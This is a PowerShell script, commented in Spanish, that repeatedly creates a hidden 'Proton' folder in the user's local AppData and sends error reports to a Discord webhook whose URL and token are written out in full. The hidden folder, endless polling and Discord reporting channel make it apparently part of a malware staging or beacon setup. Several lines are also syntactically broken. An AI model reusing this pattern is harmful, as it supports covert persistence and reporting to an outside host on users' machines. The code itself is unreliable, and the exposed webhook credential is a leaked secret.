$check = 1
$reportes = @()

function reporte {
    try {
        $webhook = "https://discord.com/api/webhooks/1345942563156393994/BDkrnul-xcAlgRjHjROWTfB17ZS7HSKvtXeaFWESO-NJQfc4JAfjPb-KO2ZXRQWIM9nX"
        
        param (
            [string]$mensaje
        )
        
        # Formato del mensaje con comillas invertidas para el bloque de código
        $contenido = @"
        \```
        $mensaje
        \```
        "@

        # Crea el cuerpo del mensaje con contenido que incluye las comillas invertidas
        $body = @{
            content = $contenido
        }

        # Convertir el cuerpo a JSON
        $jsonData = $body | ConvertTo-Json -Depth 3
        
        # Enviar el mensaje al webhook de Discord
        Invoke-RestMethod -Uri $webhook -Method Post -Body $jsonData -ContentType "application/json; charset=utf-8"
    }
    catch {
        # Capturar errores
        Write-Host "Error: $($_.Exception.Message)"
        Exit
    }
}

while ($check -eq 1) {
    try {
        $root = Join-Path -Path $env:LOCALAPPDATA -ChildPath "Proton"

        # Verifica si la carpeta existe, y si no, la crea
        if (-not (Test-Path $root)) {
            New-Item -Path $root -ItemType Directory

            # Añadir reporte si no se encuentra la carpeta
            $reportes.Add("La carpeta 'Proton' no estaba presente, se ha creado.")
        }

        # Ocultar la carpeta
        Set-ItemProperty -Path $root -Name Attributes -Value Hidden

        # Verificación exitosa
        $reportes.Add("La carpeta 'Proton' existe o ha sido creada y oculta exitosamente.")

    }
    catch {
        # Enviar reporte de error
        reporte "REPORTE: ERROR`n$($_.Exception.Message)"
    }

    # Pausa o lógica adicional (por ejemplo, esperar un tiempo antes de volver a verificar)
    Start-Sleep -Seconds 10
}
